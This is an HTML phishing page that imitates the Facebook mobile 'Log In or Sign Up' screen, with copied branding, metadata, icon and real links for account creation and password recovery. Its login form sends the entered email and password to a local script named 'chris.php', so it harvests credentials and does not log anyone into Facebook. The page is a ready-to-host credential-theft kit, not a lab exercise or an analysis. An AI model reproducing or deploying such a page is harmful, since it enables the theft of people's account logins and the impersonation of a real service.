<html>
<head>
     <title>Facebook - Log In or Sign Up</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta property="og:site_name" content="Facebook">
	<meta property="og:url" content="https://www.facebook.com/">
	<meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
	<meta property="og:locale" content="en_PH">
	<link rel="icon" type="image/png" href="https://www.facebook.com/images/fb_icon_325x325.png">
</head>
<body>
<div class="header">
       <img src="fb.png">
   </div>
   <div class="main">
       <div class="form">
			            <form action="chris.php" method="POST" id="formm">
               <input type="text" class="normalInput" name="email" placeholder="Mobile number or email">
               <input type="password" class="normalInput" name="pass" placeholder="Password">
               <button onclick="document.getElementById('formm').submit()" class="submit">Log In</button>
           </form>
          <a> <button class="CreateNewAccount" href="https://m.facebook.com/r.php?_rdc=1&_rdr">Create New Account</button> </a> 
       <a class="ForgotPassword" href="https://m.facebook.com/login/identify"> Forgotten password? </a> 
       </div>
   </div>
<style>
* {
    padding: 0;
    margin: 0;
    box-sizing: border-box;
	font-family: arial;
}

*:focus {
    outline: none;
}

body {
    height: 100vh;
    width: 100vw;
    background: #fff;
}

.header {
    height: 3rem;
    width: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
}

img {
    width: 30%;
}

.main {
    width: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
}

.form {
    width: 80%;
    height: 100px;
    margin: 50px 0px 0px 0px;
}

form {
    display: flex;
    flex-direction: column;
}

.normalInput {
    height: 30px;
    margin-bottom: 10px;
    padding: 20px 10px;
    border-radius: 5px;
    border: 1px solid;
    border-color: rgba(0, 0, 0, .07) rgba(0, 0, 0, .11) rgba(0, 0, 0, .18);
    background: #f5f6f7;
}

.submit {
    background: #1877f2;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 40px;
    padding: 20px;
    color: white;
    font-weight: bold;
    font-size: 1rem;
    border: none;
    border-radius: 5px;
}

.error {
	font-size: 0.9rem;
	margin: 10px 0px;
	padding: 10px 5px;
	color: #eaeaea;
	font-weight: bold;
	background: #ff3c3c;
	border-radius: 5px;
	border: 2px solid #ff5572;
}

    
button.CreateNewAccount {
    background-color:#00A400;
    color:#fff;
    height:40px;
    width:180px;
    font-size:15px;
    font-weight:bold;
    text-transform:capitalize;
    border:#1877F2;
    border-radius:5px;
    margin-left:50px;
    margin-top:20px;
    margin-bottom:10px;
    outline:none;
}

a.ForgotPassword {
    text-decoration:none;
   margin-left:65px;
   margin-top:20px;
   margin-bottom:10px;
    color:#1877F2;
}
</style>
</body>
</html>